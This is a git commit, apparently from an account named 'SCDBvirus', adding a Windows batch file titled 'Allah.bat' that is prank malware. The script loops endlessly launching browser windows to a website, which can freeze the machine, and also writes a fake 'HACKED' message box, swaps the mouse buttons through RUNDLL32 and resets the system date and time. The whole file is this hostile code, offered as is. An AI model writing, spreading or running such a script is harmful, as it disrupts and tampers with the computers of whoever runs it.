72cdf67fe5eb9a470ee5f0da0490b6801e94c63b
SCDBvirus <78823491+SCDBvirus@users.noreply.github.com>
2022-01-18 11:43:06 -0800

    Add files via upload

---
+++ Allah.bat
@@ -0,0 +1,9 @@
+:looop
+
+start thispersondoesnotexist.com
+goto looop
+echo Msgbox"Imagine getting hacked lol",0+0,"HACKED">>msg.vbs
+start msg.vbs
+RUNDLL32 USER32.DLL,SwapMouseButton
+date 22/08/2014
+time 06:06:06
